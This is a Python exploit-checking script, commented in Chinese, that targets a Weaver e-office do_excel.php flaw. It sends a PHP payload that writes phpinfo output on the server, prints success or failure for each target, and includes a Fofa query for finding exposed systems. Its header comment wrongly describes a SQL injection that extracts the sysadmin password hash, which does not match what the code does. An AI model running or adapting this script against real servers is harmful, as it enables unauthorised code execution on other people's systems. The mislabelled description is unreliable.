# -*- coding: utf-8 -*-
# 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值
# Fofa:  app="泛微-协同办公OA"

import sys
import requests
import urllib3
import time
from rich.console import Console


console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    target_url = target_url + "/general/charge/charge_list/do_excel.php"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }
    console.print(now_time() + " [INFO]     正在检测泛微e-office doexecl.php-RCE", style='bold blue')
    data="html=<?+phpinfo();?>"
    try:
        res = requests.post(url=target_url, headers=headers,data=data,verify=False, timeout=10)
        response=requests.get(url=target_url, headers=headers,verify=False)
        if res.status_code == 200 and "disable_functions" in res.text:
            console.print(now_time() + " [SUCCESS]  存在e-office doexecl.php-RCE{},phpinfo已经写入".format(target_url), style=    'bold green')
        else:
            console.print(now_time() + " [WARNING]  不存e-office doexecl.php-RCE", style='bold red')
    except:
        console.print(now_time() + " [ERROR]    代码异常，或无法连接目标 ", style='bold red')



